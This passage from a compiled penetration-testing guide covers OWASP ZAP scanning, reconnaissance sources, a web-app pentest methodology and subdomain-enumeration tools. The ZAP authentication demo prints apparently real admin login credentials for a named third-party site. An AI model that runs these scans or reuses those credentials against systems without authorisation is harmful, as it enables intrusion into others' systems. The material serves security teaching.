can be done to a site’s functionality, data, etc. If you are worried about using ZAP, you can 
prevent it from causing harm (though ZAP’s functionality will be significantly reduced) by 
switching to safe mode. 
To switch ZAP to safe mode, click the arrow on the mode dropdown on the main toolbar to 
expand the dropdown list and select Safe Mode. 
[[ PAGE 47 ]]
Running an Automated Scan 
The easiest way to start using ZAP is via the Quick Start tab. Quick Start is a ZAP add-on that is 
included automatically when you installed ZAP. 
To run a Quick Start Automated Scan : 
1. Start ZAP and click the Quick Start tab of the Workspace Window. 
2. Click the large Automated Scan button. 
3. In the URL to attack text box, enter the full URL of the web application you want to 
attack. 
4. Click the Attack 
 
ZAP will proceed to crawl the web application with its spider and passively scan each page it 
finds. Then ZAP will use the active scanner to attack all of the discovered pages, functionality, 
and parameters. 
ZAP provides 2 spiders for crawling web applications, you can use either or both of them from 
this screen. 
The traditional ZAP spider which discovers links by examining the HTML in responses from the 
web application. This spider is fast, but it is not always effective when exploring an AJAX web 
application that generates links using JavaScript. 
For AJAX applications, ZAP’s AJAX spider is likely to be more effective. This spider explores the 
web application by invoking browsers which then follow the links that have been generated. 
The AJAX spider is slower than the traditional spider and requires additional configuration for 
use in a “headless” environment. 
ZAP will passively scan all of the requests and responses proxied through it. So far ZAP has only 
carried out passive scans of your web application. Passive scanning does not change responses 
in any way and is considered safe. Scanning is also performed in a background thread to not 
slow down exploration. Passive scanning is good at finding some vulnerabilities and as a way to 
[[ PAGE 48 ]]
get a feel for the basic security state of a web application and locate where more investigation 
may be warranted. 
Active scanning, however, attempts to find other vulnerabilities by using known attacks against 
the selected targets. Active scanning is a real attack on those targets and can put the targets at 
risk, so do not use active scanning against targets you do not have permission to test. 
Interpret Your Test Results 
As ZAP spiders your web application, it constructs a map of your web applications’ pages and 
the resources used to render those pages. Then it records the requests and responses sent to 
each page and creates alerts if there is something potentially wrong with a request or 
response. 
See Explored Pages 
To examine a tree view of the explored pages, click the Sites tab in the Tree Window. You can 
expand the nodes to see the individual URLs accessed. 
View Alerts and Alert Details 
The left-hand side of the Footer contains a count of the Alerts found during your test, broken 
out into risk categories. These risk categories are: 
 
To view the alerts created during your test: 
1. Click the Alerts tab in the Information Window. 
2. Click each alert displayed in that window to display the URL and the vulnerability 
detected in the right side of the Information Window. 
3. In the Workspace Windows, click the Response tab to see the contents of the header 
and body of the response. The part of the response that generated the alert will be 
highlighted. 
Exploring an Application Manually  
The passive scanning and automated attack functionality is a great way to begin a vulnerability 
assessment of your web application but it has some limitations. Among these are: 
• 
Any pages protected by a login page are not discoverable during a passive scan 
because, unless you’ve configured ZAP’s authentication functionality, ZAP will not 
handle the required authentication. 
[[ PAGE 49 ]]
• 
You don’t have a lot of control over the sequence of exploration in a passive scan or 
the types of attacks carried out in an automated attack. ZAP does provide many 
additional options for exploration and attacks outside of passive scanning. 
Spiders are a great way to explore your basic site, but they should be combined with manual 
exploration to be more effective. Spiders, for example, will only enter basic default data into 
forms in your web application but a user can enter more relevant information which can, in 
turn, expose more of the web application to ZAP. This is especially true with things like 
registration forms where a valid email address is required. The spider may enter a random 
string, which will cause an error. A user will be able to react to that error and supply a correctly 
formatted string, which may cause more of the application to be exposed when the form is 
submitted and accepted. 
You should explore all of your web application with a browser proxying through ZAP. As you do 
this, ZAP passively scans all the requests and responses made during your exploration for 
vulnerabilities, continues to build the site tree, and records alerts for potential vulnerabilities 
found during the exploration. 
It is important to have ZAP explore each page of your web application, whether linked to 
another page or not, for vulnerabilities. Obscurity is not security, and hidden pages sometimes 
go live without warning or notice. So be as thorough as you can when exploring your site. 
You can quickly and easily launch browsers that are pre-configured to proxy through ZAP via 
the Quick Start tab. Browsers launched in this way will also ignore any certificate validation 
warnings that would otherwise be reported. 
 
To Manually Explore your application: 
1. Start ZAP and click the Quick Start tab of the Workspace Window. 
2. Click the large Manual Explore button. 
3. In the URL to explore text box, enter the full URL of the web application you want to 
explore. 
4. Select the browser you would like to use 
[[ PAGE 50 ]]
5. Click the Launch Browser 
This option will launch any of the most common browsers that you have installed with new 
profiles. 
If you would like to use any of your browsers with an existing profile, for example with other 
browser add-ons installed, then you will need to manually configure your browser to proxy via 
ZAP and import and trust the ZAP Root CA Certificate. See the ZAP Desktop User Guide for 
more details. 
By default the ZAP Heads Up Display (HUD) will be enabled. Unchecking the relevant option on 
this screen before launching a browser will disable the HUD. 
The Heads Up Display  
The Heads Up Display (HUD) is a new an innovative interface that provides access to ZAP 
functionality directly in the browser. It is ideal for people new to web security and also allows 
experienced penetration testers to focus on an applications functionality while providing key 
security information and functionality. 
 
The HUD is overlayed on top of the target application in your browser when enabled via the 
‘Manual Explore’ screen or toolbar option. Only modern browsers such as Firefox and Chrome 
are supported. 
By default a splash screen is shown for the HUD which includes a link to a tutorial which will 
take you through the HUD features and explain how you can use them. 
ZAP Advanced Features  
[[ PAGE 51 ]]
Advanced Desktop Features  
The desktop has a large number of features that are not immediately apparent so that new 
users are not overwhelmed. 
There are many tabs that are not shown by default. They can be accessed via the right hand 
tabs with green ‘+’ icons. You can pin any tabs you would like to always appear by right clicking 
on them. Many of the tabs hidden by default will appear when relevant. For example the 
Websockets tab will appear if an application you are proxying through ZAP starts to use 
Websockets. 
The desktop also makes heavy use of context sensitive right click options, so right click 
everywhere while you are getting used to the user interface. 
The ZAP Marketplace  
The ZAP desktop has a plugin architecture which means that new functionality can be added 
dynamically. 
An online marketplace provides a wide range of ZAP add-ons which add many additional 
features to ZAP. 
The marketplace can be accessed from within ZAP via the ‘Manage Add-ons’ button on the 
toolbar: 
 
All of the add-ons on the marketplace are completely free. 
Automation  
ZAP is an ideal tool to use in automation and supports a range of options: 
• 
Docker Packaged Scans 
• 
GitHub Actions 
• 
Automation Framework 
• 
API and Daemon mode 
Learn More About ZAP  
Now that you are familiar with a few basic capabilities of ZAP, you can learn more about ZAP’s 
capabilities and how to use them from ZAP’s Desktop User Guide. The User Guide provides 
step-by-step instructions, references for the API and command-line programming, instructional 
videos, and tips and tricks for using ZAP. 
Additional links are also available via the ‘Learn More’ button on the Quick Start top screen: 
[[ PAGE 52 ]]
 
https://www.zaproxy.org/getting-started/ 
ZAP advantages: 
• 
Zap provides cross-platform i.e. it works across all OS (Linux, Mac, Windows) 
• 
Zap is reusable 
• 
Can generate reports 
• 
Ideal for beginners 
• 
Free tool 
How Does ZAP Work? 
ZAP creates a proxy server and makes the website traffic pass through the server. The use of 
auto scanners in ZAP helps to intercept the vulnerabilities on the website. 
Refer to this flow chart for a better understanding: 
[[ PAGE 53 ]]
 
ZAP Terminologies 
Before configuring ZAP setup, let us understand some ZAP terminologies: 
#1) Session: Session simply means to navigate through the website to identify the area of 
attack. For this purpose, any browser like Mozilla Firefox can be used by changing its proxy 
settings. Or else we can save zap session as .session and can be reused. 
#2) Context: It means a web application or a set of URLs together. The context created in the 
ZAP will attack the specified one and ignore the rest, to avoid too much data. 
#3) Types of ZAP Attacks: You can generate a vulnerability report using different ZAP attack 
types by hitting and scanning the URL. 
Active Scan: We can perform an Active scan using Zap in many ways. The first option is 
the Quick Start, which is present on the welcome page of the ZAP tool. Please refer the below 
screenshot: 
Quick Start 1 
[[ PAGE 54 ]]
 
The above screenshot shows the quickest way to get started with ZAP. Enter the URL under the 
Quick Start tab, press the Attack button, and then progress starts. 
Quick Start runs the spider on the specified URL and then runs the active scanner. A spider 
crawls on all of the pages starting from the specified URL. To be more precise, the Quickstart 
page is like “point and shoot”. 
Quick Start 2 
 
Here, upon setting the target URL, the attack starts. You can see the Progress status as 
spidering the URL to discover content. We can manually stop the attack if it is taking too much 
time. 
[[ PAGE 55 ]]
Another option for the Active scan is that we can access the URL in the ZAP proxy browser as 
Zap will automatically detect it. Upon right-click on the URL -> Active scan will launch. Once the 
crawl is complete, the active scan will start. 
Attack progress will be displayed in the Active scan Tab. and the Spider tab will show the list 
URL with attack scenarios. Once the Active scan is complete, results will be displayed in the 
Alerts tab. 
Please check the below screenshot of Active Scan 1 and Active Scan 2 for clear understanding. 
Active scan 1 
 
Active scan 2 
 
#4) Spider: Spider identifies the URL in the website, check for hyperlinks and add it to the list. 
#5) Ajax Spider: In the case where our application makes heavy use of JavaScript, go for AJAX 
spider for exploring the app. I will explain the Ajax spider in detail in my next tutorial. 
#6) Alerts: Website vulnerabilities are flagged as high, medium and low alerts. 
ZAP Installation 
[[ PAGE 56 ]]
Now, we will understand the ZAP installation setup. First, download the Zap installer. As I am 
using Windows 10, I have downloaded Windows 64 bit installer accordingly. 
Pre-requisites for Zap installation: Java 7  is required. If you don’t have java installed in your 
system, get it first. Then we can launch ZAP. 
Setup ZAP Browser 
First, close all active Firefox sessions. 
Launch Zap tool >> go to Tools menu >> select options >> select Local Proxy >> there we can 
see the address as localhost (127.0.0.1) and port as 8080, we can change to other port if it is 
already using, say I am changing to 8099. Please check the screenshot below: 
Local proxy in Zap 1 
 
Now, open Mozilla Firefox >> select options >> advance tab >> in that select Network >> 
Connection settings >>select option Manual proxy configuration. Use the same port as in the 
Zap tool. I have manually changed to 8099 in ZAP and used the same in the Firefox browser. 
Check below screenshot of the Firefox configuration set up as a proxy browser. 
Firefox proxy setup 1 
[[ PAGE 57 ]]
 
Try to connect your application using your browser. Here, I have tried to 
connect Facebook and it says your connection is not secure. So you need to add an exception, 
and then confirm Security Exception for navigating to the Facebook page. Please refer the 
screenshots below: 
Access webpage -proxy browser 1 
 
Access webpage -proxy browser 2 
[[ PAGE 58 ]]
 
Access webpage -proxy browser 3 
 
At the same time, under the Zap’s sites tab, check the created new session for the Facebook 
page. When you have successfully connected your application you can see more lines in the 
history tab of ZAP. 
Zap normally provide additional functionality that can be accessed by right-click menus like, 
Right-click >> HTML >> active scan, then zap will perform active scan and display results. 
If you can’t connect your application using the browser, then check your proxy settings again. 
You will need to check both browser and ZAP proxy settings. 
Generating Reports In ZAP 
[[ PAGE 59 ]]
Once the Active scan is done, we can generate reports. For that click OWASP ZAP >> Report >> 
generate HTML reports >> file path provided >> scan report exported. We need to examine the 
reports for identifying all possible threats and get them fixed. 
ZAP Authentication, Session And User Management 
Let us move on to another Zap feature, handling authentication, session and user 
management. Please let me know any query that comes into your mind related to this as 
comments. 
Basic Concepts 
• 
Context: It represents a web application or set of URLs together. For a given Context, 
new tabs are added to customize and configure the authentication and session 
management process. The options are available in the session properties dialog .i.e 
Session properties dialog -> Context -> you can either use the default option or add a 
new context name. 
• 
Session Management Method: There are 2 types of session management methods. 
Mostly, cookie-based session management is used, associated with the Context. 
• 
Authentication Method: There are mainly 3 types of Auth method used by ZAP: 
• 
Form-based Authentication method 
• 
Manual Authentication 
• 
HTTP Authentication 
• 
User management: Once the authentication scheme has been configured, a set of 
users can be defined for each Context. These users are used for various actions (For 
Example, Spider URL/Context as User Y, send all requests as User X). Soon, more 
actions will be provided that make use of the users. 
A “Forced-User” extension is implemented to replace the old authentication extension that 
was performing re-authentication. A ‘Forced-User’ mode is now available via the toolbar (the 
same icon as the old authentication extension). 
After setting a user as the ‘Forced-User’ for a given context or when it is enabled, every 
request sent through ZAP is automatically modified so that it is sent for this user. This mode 
also performs re-authentication automatically (especially in conjunction with the Form-Based 
Authentication) if there is a lack of authentication, ‘logged out’ is detected. 
Let us see a demo: 
Step 1: 
First, launch ZAP and access the URL in the proxy browser. Here, I have taken the sample URL 
as https://tmf-uat.iptquote.com/login.php. Click on Advanced -> add Exception -> confirm 
security exception as in page 6 and 7. Then the landing page gets displayed. At the same time 
ZAP automatically loads the Webpage under Sites as a new session. Refer to the below image. 
[[ PAGE 60 ]]
 
Step 2: 
Include it in a context. This can be done either by including it in a default context or adding it 
as a new context. Refer to the below image. 
 
Step 3: 
Now, next is the Authentication method. You can see Authentication in that session properties 
dialog itself. Here we are using the Form-based Auth method. 
It should be like authMethodParams as “login Url=https://tmf-
uat.iptquote.com/login.php&loginRequestData=username=superadmin&password=primo86
8&proceed=login” 
In our example, we need to set the authentication method as Form-based. For this, select the 
target URL, login request post data field gets pre-filled, after that, change parameter as 
username and password -> click ok. 
[[ PAGE 61 ]]
 
Step 4: 
Now, set indicators that will tell ZAP when it is authenticated. 
Logged in and logged out indicators: 
• 
Only one is necessary 
• 
We can set Regex patterns matched in the response message, need to set either 
logged in or log out indicator. 
• 
Identify when a response is authenticated or when not. 
• 
Example for Logged in indicator: \Qhttp://example/logout\E or Welcome User.* 
• 
Example of the Logged out indicator: login.jsp or something like that. 
Here, in our demo application, I have accessed the URL in a proxy browser. Logged in to the 
application using a valid credential, Username as superadmin & Password as primo868. 
Navigate through inner pages and click on logout 
You can see in Step 3 screenshot, Zap takes the login request data as one used for the TMF 
application login [Demo application login]. 
Flag logged in Regex pattern from the Response of ZAP as Response -> logged out response -> 
flag it as logged in the indicator.  Refer to the screenshot below 
[[ PAGE 62 ]]
 
Step 5: 
We can save the indicator and verify whether session properties dialog gets added with the 
logged-in indicator or not. Refer to the screenshot below: 
 
Step 6: 
We need to add users, valid and invalid users. Apply spider attacks to both and analyze the 
results. 
Valid User: 
[[ PAGE 63 ]]
 
Invalid User: 
 
Step 7: 
By default set the session management as a cookie-based method. 
 
[[ PAGE 64 ]]
Step 8: 
Spider URL attack is applied to invalid and valid users and review results/generate reports. 
Invalid user spider attack view 1: 
 
Here, a spider URL attack is applied to the invalid user. In the ZAP interface, we can see Get: 
login.php (error _message), which means authentication has failed. Also, it doesn’t pass the 
URLs through inner TMF pages. 
Step 9: 
To apply spider URL attack for the valid user, go to sites list -> attack -> spider URL -> existing 
valid user -> here it is enabled by default -> start scan. 
Analyze results: As it is a valid authenticated user, it will navigate through all inner pages and 
display authentication status as successful. Refer below screenshot. 
Valid-user 
[[ PAGE 65 ]]
 
ZAP Html Report Sample 
Once an active scan is completed, we can generate an HTML report for the same. For this, 
select Report -> Generate Html Report. I have attached a sample content of HTML reports. 
Here, high, medium and low alerts reports will be generated. 
Alerts 
 
Conclusion 
In this tutorial, we have seen what ZAP is, how ZAP works, installation and ZAP proxy setup. 
Different types of Active scan processes, a demo of ZAP authentication, session and user 
management, and basic terminologies. In my next tutorial, I will explain about Ajax spider 
attack, use of fuzzers, Forced browsed sites. 
[[ PAGE 66 ]]
Suggested reading =>> Top alternatives to OWASP ZAP  
And if you have used Zed attack proxy and have some interesting tips to share, do share in 
the comments below. 
References: 
• 
OWASP 
• 
ZED ATTACK PROXY 
• 
TUTORIAL VIDEOS 
https://www.softwaretestinghelp.com/owasp-zap-tutorial/ 
Web Application Information Gathering 
Information Gathering is the first and foundation step in the success of penetration 
testing.  The more useful information you have about a target, the more you can find 
vulnerabilities in the target and find more serious problems in the target by exploiting them (to 
demonstrate). In this article, I am discussing information gathering techniques for penetration 
testing of IT infrastructure. 
(1) Whois Lookup (http://whois.domaintools.com) 
It helps in identifying the owner of a target, hosted company, and location of servers, IP 
address, Server Type, etc. You need to just the domain name and you may will get the juicy 
information. 
 
Click Here for Active Reconnaissance Tools used for Penetration Testing 
(2) Identify technologies of the target web application 
It helps in identifying technologies used in the development of web applications. It also helps 
in determining the outdated modules of software used in development. Later you can search 
exploits on exploit-db.com to further demonstrate the exploitation of issues in the web 
application. I am listing out resources that can be used to identify technologies of target: 
▪ 
Wappalyzer 
[[ PAGE 67 ]]
▪ 
Netcraft site report (https://toolbar.netcraft.com/site_report) 
▪ 
https://builtwith.com/ 
 
(3) Robtex (https://www.robtex.com/) 
This resource is perfect for gathering information related to DNS. Click Here to know more 
methods of performing DNS Enumeration. 
 
Click Here to Test DNS Zone Transfer 
(4) Subdomain Enumeration 
Subdomain Enumeration is a technique to identify unused subdomains registered with the 
organization. Many tools available for subdomain enumeration like Knockpy, sublist3r, etc. are 
some of them. 
▪ 
Download Link (Knockpy): https://github.com/guelfoweb/knock 
▪ 
Download Link (Sublist3r):https://github.com/aboul3la/Sublist3r 
(5) Shodan (https://www.shodan.io/) 
[[ PAGE 68 ]]
It is considered the first search engine to identify assets that are 
connected t0 the internet. It helps identify the misconfigured IoT 
devices (like a camera), IT infrastructure and monitor an organization's 
network security. 
 
(6) Certificate Transparency (CT) (https://www.certificate-
transparency.org/) 
Certificate Authority (CA) needs to publish all SSL/TLS certificates 
which they issue. This portal is open for the public and anyone can see 
the CT logs and identify certificates issue for a particular domain. 
Click Here to know Passive Reconnaissance Techniques for 
Penetration Testing 
(7) Discovering Sensitive Files 
Many tools are available for finding the URL of sensitive files. One 
such tool is dirb which is a web content discovery tool. 
[[ PAGE 69 ]]
 
Usage: 
 
Click Here to know Passive Reconnaissance Techniques For 
Penetration Testing 
(8) American Registry for Internet Numbers (ARIN) 
ARIN organization manages the IP address numbers for the U.S. and 
its assigned territories. By using the below URL, you will get a lot of 
information related to an organization's systems configuration from 
public domain sources. 
URL: https://www.arin.net/ 
[[ PAGE 70 ]]
 
(9) Autonomous System Number (ASN) 
To identify ASN for the organization, use https://bgp.he.net/ by 
keyword. 
 
(10) Port Scanning 
To identify web ports and other useful information such as Operating 
System, device type, MAC addresses etc. by proving URL or IP. 
▪ Nmap 
▪ Masscan 
Click Here to know 12 iOS Application Security Testing Tools  
Google: Ultimate Tool for Information Gathering 
By using multiple google search options, you can find sensitive data 
lying unattended on the internet. Click Here to know more awesome 
queries that help you to get juicy information. 
[[ PAGE 71 ]]
site:google.com -site:www.google.com filetype:pdf 
 
https://allabouttesting.org/information-gathering-techniques-for-penetration-testing/  
What Steps And Methodologies Are Used To Perform A Web App Pen Test? 
  
To emphasize the difference between an application and a web application, penetration 
testing the web application mainly focuses on the environment and the setup of the web 
app. 
  
In other words, testing the web application focuses on gathering public information about 
the web app and then continuing to map out the network involved in hosting the web app. 
Investigating for possible injection tampering attacks and the actual learning and handling of 
the application comes later. 
  
Step 1: Information Gathering 
  
Information gathering, or the reconnaissance phase, is the most important step in any 
penetration testing process as it provides you with a wealth of information to identify 
vulnerabilities easily and exploit them later. 
  
Think of this phase as a foundation to a pyramid you are trying to build. 
  
[[ PAGE 72 ]]
There are two types of reconnaissance depending on the type of interaction you want to 
achieve with the target system: 
  
1. Active Reconnaissance 
2. Passive Reconnaissance 
  
Passive Reconnaissance 
  
Gathering information that is already available on the internet and doing so without directly 
interacting with the target system is called passive reconnaissance. 
  
Most research in this phase is done online using various websites, beginning with Google. 
The first step often involves using Google syntax, enumerating website subdomains, links 
and much more. 
  
For example, if subdomains of a certain website are of interest, you can use the following 
syntax to narrow down the Google search results: “site:*.domain.com”. 
  
 
  
You can use Wayback Machine to view how a certain website looked a while back ago, this 
website can help you interact with the target of the web application without directly coming 
into contact with it. 
[[ PAGE 73 ]]
  
 
  
You can probe the old version of the website and note down any characteristics that might 
help you later in the research and exploitation phase. 
  
Active Reconnaissance 
  
In contrast to passive reconnaissance, active reconnaissance directly probes the target 
system and retrieves an output. 
  
Examples of active reconnaissance include fingerprinting the web application, using the 
Shodan network scanner, performing a DNS forward and reverse lookup, a DNZ zone 
transfer, and more. 
  
Fingerprinting The Web Application Using Nmap 
  
Fingerprinting a web application involves gathering information about the web app such as 
the scripting language used, server software and version, along with the OS of the server. 
Much of this can be done using the Nmap network scanner. 
  
Run the Nmap against the target IP or the target IP range and note down all open ports and 
services that are running, along with the above-mentioned information regarding the OS 
version. 
  
Shodan Network Scanner 
  
Using the Shodan network scanner, you can identify additional information regarding the 
hosted web app if publicly available to the internet. 
[[ PAGE 74 ]]
  
 
  
Shodan provides vast information regarding any publicly available IP that it scans. 
Information range from geolocation, port numbers opened, server software used and a few 
other useful details. 
  
DNS Forward And Reverse Lookup 
  
In order to associate the newly discovered subdomains with their respective IP addresses, 
you can use forward dns lookup, ping, and even use more advanced tools such as Burp Suite. 
  
DNS Zone Transfer 
  
To perform DNS zone transfer, use “nslookup” command to identify the DNS servers. Other 
options are websites specifically made for DNS server identification. After identifying all the 
DNS servers, use the “dig” command and attempt the DNS zone transfer. 
  
Identifying Related External Sites 
  
This is an important step in the information gathering stage as there is usually traffic flowing 
between external sites and the target site. This is done easiest with Burp Suite, which we will 
cover in more detail later. 
  
[[ PAGE 75 ]]
Inspect HEAD and OPTIONS HTTP requests 
  
Responses from HEAD and OPTION requests will most definitely reveal the web server 
software and version. Sometimes the responses contain even more valuable data. 
  
You can easily intercept this information by visiting the target website while having Burp 
Suite’s “intercept on” feature turned on. 
  
Gather information about the web app through error pages 
  
Error pages can provide a lot of useful feedback regarding the version and type of server the 
website is ran on. Based on this information you can start visualizing the environment of the 
web application. 
  
Simply modify the URL of the desired website and try to cause the 404 not found error. In 
the case below, a website forum not found page reveals the server and its version 
(ngnix/1.12.2). 
  
 
Examining the source code 
  
Source code can also provide a lot of useful information that you can later use to find a 
vulnerability. 
  
By examining the webpage code carefully, you will be able to determine the application 
environment and the overall workings of the application. 
  
[[ PAGE 76 ]]
In the screenshot below, we can see that the website is running on Apache server, version 
2.2.14. 
  
 
  
Documenting during the Reconnaissance Phase 
  
It is vital to document everything in an organized manner during your investigation gathering 
phase. 
  
This will give you a baseline from which you will continue to further study the target and 
hopefully find vulnerabilities in the system to later exploit. 
  
Next, we will introduce some of the most popular tools used for application penetration 
testing and demonstrate some techniques regarding security scanning, sql injections, 
passwords brute force cracking and other important penetration testing techniques you can 
use. 
  
Step 2: Research And Exploitation 
  
There is a sea of security tools at your disposal when it comes to performing web app 
penetration testing and most of them are open source. 
  
However, in order to narrow down your choice to just a few tools can be challenging. That’s 
why the reconnaissance phase is so important. 
  
Not only do you find all the necessary information you need in order to find vulnerabilities 
and exploits later on, but you also narrow down the attack vectors, and hence, the tools you 
can use to accomplish your goal. 
  
[[ PAGE 77 ]]
What Tools Are Used For Web Application Penetration Testing? 
  
The entire penetration testing process depends deeply on the reconnaissance phase and the 
discovered vulnerabilities. Finding the right exploit and gaining access into the system is far 
more easier with a thorough investigation. 
  
Tools such as online scanners and searching engines can help you passively collect 
information about your target. Use Nmap to enumerate the target system and discover live 
ports. 
  
Popular tools commonly used during website penetration testing include: 
  
• 
W3af 
• 
Burp Suite 
• 
SQLMap 
• 
Metasploit 
• 
Hydra 
• 
John Ripper 
• 
Skipfish 
• 
Ratproxy 
• 
Wfuzz 
• 
Watcher 
  
For automated web app vulnerability scanning, sniffing and exploitation stages, you can use 
tools such as W3af scanner, Burp Suite Toolkit, SQLMap, various password cracking tools 
such as Hydra or John Ripper. 
  
A plethora of other tools are also available as part of the Metasploit project but are 
unfortunately out of scope of this article. 
  
Metasploit framework in Kali Linux will definitely be the go to choice, but you can also 
supplement it with some of the industry best tools specifically designed to aid in web 
application penetration testing process. 
  
[[ PAGE 78 ]]
The below list of tools and their capabilities will give you an introduction into what is 
possible with just a little bit of tampering with a vulnerable web application. 
  
Web Application Framework (W3af ) 300 
  
W3af or Web Application Framework is a security scanner 
mainly used for discovering vulnerabilities. You can use W3af in almost web app penetration 
testing engagement to quickly probe the target website and its hosting server. 
  
To start, open the W3af console by typing “cd w3af. Once in the right directory, type 
“./w3af_console to open the w3af. 
  
 
  
Next, type in “target”, “set target x.x.x.x” and hit enter. Type “back” to jump up a directory 
and the configuration is going to be saved. 
  
 
  
[[ PAGE 79 ]]
Finally, type in “set plugins” in order to choose the desired scanning options. In this case, 
choose all by typing “audit all” and type “back” to return one directory. Write “start” and 
run the scan. 
  
 
  
Once the scan is complete, W3af will report on vulnerabilities the scan found. In the case 
below, W3af found that the target system was running on Apache server version 2.2.8 and 
PHP 5.2.4. 
  
[[ PAGE 80 ]]
 
  
Both of these versions are vulnerable to a CSS or Cross Side Scripting attack as reported by 
W3af. 
  
In summary, W3af has more features related to exploitation but are too vast to show in this 
article. Nonetheless, it is a fast and easy way to quickly gather information regarding the 
target system. 
  
Burp Suite 
  
Burp Suite is an open-source web application 
penetration testing tool that comes in two options. The open-source version is free to be 
used by anyone but with various features missing from the tool. 
  
The commercial version of Burp Suite offers a lot more automation and capabilities and is 
licensed to many penetration testing companies. 
[[ PAGE 81 ]]
  
The various capabilities within Burp Suite make it an all-around web application security 
testing tool that can be used throughout the entire penetration testing process. Gathering 
http traffic with Burp Suite is easy and the possibilities are vast in the area of exploitation. 
  
For the purpose of demonstrating the most useful aspects of Burp Suite, below is a simple 
example of capturing http traffic with Burp Suite and than performing an SQL injection 
attack using Sqlmap. 
  
To start, open Burp Suite by navigating to the left side of your Kali Linux desktop and find 
Burp Suite in the category of “Web Application Analysis” tab. After loading, make sure your 
“intercept” tab has “intercept is on” selected. 
  
 
  
Next, set up Burp Suite to act as your web proxy in your Firefox browser. Open 
“preferences” button, go to “advanced settings” à“connection settings” à choose “manual 
proxy configuration” and fill in the IP address and port numbers: 127.0.0.1 and 8080. 
  
 
  
[[ PAGE 82 ]]
Now that everything is setup, navigate to your target website through your Firefox browser 
and insert a 1 in the vulnerable part of the application’s URL. 
  
In this case, the vulnerable PHP version allowed us to inject a “1” after the “title” section and 
confirm that an SQL injection is possible. 
  
With the captured traffic, Burp Suite is no longer needed and the “intercept is on” can be 
turned off. Save the captured traffic to a file and exit Burp Suite. 
  
 
  
In order to perform the actual SQL injection, we are going to open SQLMap and perform the 
attack. But first, a bit of background on SQLMap will make you realize just how useful this 
tool is. 
https://purplesec.us/web-application-penetration-testing/  
Subdomain Enumeration and Fingerprinting 
 
Why so many tools & techniques? 
• 
The more techniques used, the more chances to find interesting subdomains 
that others might have missed. 
• 
Some bug hunters recommend using only a handful of tools (like Amass, Massdns, 
Subfinder & Gobuster). But people who have a bad Internet connection & no VPS 
won’t be able to use these highly effective & fast tools. So choose whatever works for 
you! 
Methods 
[[ PAGE 83 ]]
• 
Scraping 
• 
Brute-force 
• 
Alterations & permutations of already known subdomains 
• 
Online DNS tools 
• 
SSL certificates 
• 
Certificate Transparency 
• 
Search engines 
• 
Public datasets 
• 
DNS aggregators 
• 
Git repositories 
• 
Text parsing (HTML, JavaScript, documents…) 
• 
VHost discovery 
• 
ASN discovery 
• 
Reverse DNS 
• 
Zone transfer (AXFR) 
• 
DNSSEC zone walking 
• 
DNS cache snooping 
• 
Content-Security-Policy HTTP headers 
• 
Sender Policy Framework (SPF) records 
• 
Subject Alternate Name (SAN) 
Linux tools 
AltDNS 
• 
Description 
o 
Subdomain discovery through alterations and permutations 
o 
https://github.com/infosec-au/altdns 
• 
Installation 
• 
git clone https://github.com/infosec-au/altdns.git 
• 
cd altdns 
• 
pip install -r requirements.txt 
• 
Usage: 
[[ PAGE 84 ]]
o 
Generate a list of altered subdomains: ./altdns.py -i known-subdomains.txt -o 
new_subdomains.txt 
o 
Generate a list of altered subdomains & resolve them: ./altdns.py -i known-
subdomains.txt -o new_subdomains.txt -r -s resolved_subdomains.txt 
o 
Other options 
▪ 
-w wordlist.txt: Use custom wordlist (default altdns/words.txt) 
▪ 
-t 10 Number of threads 
▪ 
-d $IP: Use custom resolver 
Amass 
• 
Description 
o 
Brute force, Google, VirusTotal, alt names, ASN discovery 
o 
https://github.com/OWASP/Amass 
• 
Installation 
o 
go get -u github.com/OWASP/Amass/... 
• 
Usage 
o 
Get target’s ASN from http://bgp.he.net/ 
o 
amass -d target.com -o $outfile 
o 
Get subdomains from ASN: amass.netnames -asn $asn 
Assets-from-spf 
• 
Description 
o 
Parse net blocks & domain names from SPF records 
o 
https://github.com/yamakira/assets-from-spf 
• 
Installation 
• 
git clone https://github.com/yamakira/assets-from-spf.git 
• 
pip install click ipwhois 
• 
Usage 
o 
cd the-art-of-subdomain-enumeration; python assets_from_spf.py target.com 
o 
Options 
▪ 
--asn: Enable ASN enumeration 
BiLE-suite 
• 
Description 
o 
HTML parsing, reverse DNS, TLD expansion, horizontal domain correlation 
[[ PAGE 85 ]]
o 
https://github.com/sensepost/BiLE-suite 
• 
Installation 
• 
aptitude install httrack 
• 
git clone https://github.com/sensepost/BiLE-suite.git 
• 
Usage 
o 
List links related to a site: cd BiLE-suite; perl BiLE.pl target.com target 
o 
 
Extract subdomains from the results of BiLe.pl: ` cat 
target.mine 
grep -v “Link 
from” 
cut -d’:’ -
f2 
grep 
target.com
Bing 
• 
Search engine 
• 
Usage 
o 
Find subsomains: site:target.com 
o 
Find subdomains & exclude specific ones: site:target.com -
site:www.target.com 
Censys_subdomain_enum.py 
• 
Description 
o 
Extract domains & emails from SSL/TLS certs collected by Censys 
o 
https://github.com/appsecco/the-art-of-subdomain-
enumeration/blob/master/censys_subdomain_enum.py 
• 
Installation 
• 
pip install censys 
• 
git clone https://github.com/appsecco/the-art-of-subdomain-enumeration.git 
o 
Add your CENSYS API ID & SECRET to the-art-of-subdomain-
enumeration/censys_subdomain_enum.py 
• 
Usage 
o 
cd the-art-of-subdomain-enumeration; python censys_enumeration.py 
target.com 
Cloudflare_enum.py 
• 
Description 
o 
Extract subdomains from Cloudflare 
o 
DNS aggregator 
[[ PAGE 86 ]]
o 
https://github.com/appsecco/the-art-of-subdomain-
enumeration/blob/master/cloudflare_subdomain_enum.py 
• 
Installation 
• 
pip install censys 
• 
git clone https://github.com/appsecco/the-art-of-subdomain-enumeration.git 
• 
Usage 
o 
the-art-of-subdomain-enumeration; python 
cloudflare_subdomain_enum.py your@cloudflare.email target.com 
Crt_enum_psql.py 
• 
Description 
o 
Query crt.sh postgres interface for subdomains 
o 
https://github.com/appsecco/the-art-of-subdomain-
enumeration/blob/master/crt_enum_psql.py 
• 
Installation 
• 
pip install psycopg2 
• 
 git clone https://github.com/appsecco/the-art-of-subdomain-enumeration.git 
• 
Usage 
o 
cd python the-art-of-subdomain-enumeration; python crtsh_enum_psql.py 
target.com 
Crt_enum_web.py 
• 
Description 
o 
Parse crt.sh web page for subdomains 
o 
https://github.com/appsecco/the-art-of-subdomain-
enumeration/blob/master/crt_enum_web.py 
• 
Installation 
• 
pip install psycopg2 
• 
 git clone https://github.com/appsecco/the-art-of-subdomain-enumeration.git 
• 
Usage 
o 
cd python the-art-of-subdomain-enumeration; python3 crtsh_enum_web.py 
target.com 
CTFR 
• 
Description 
o 
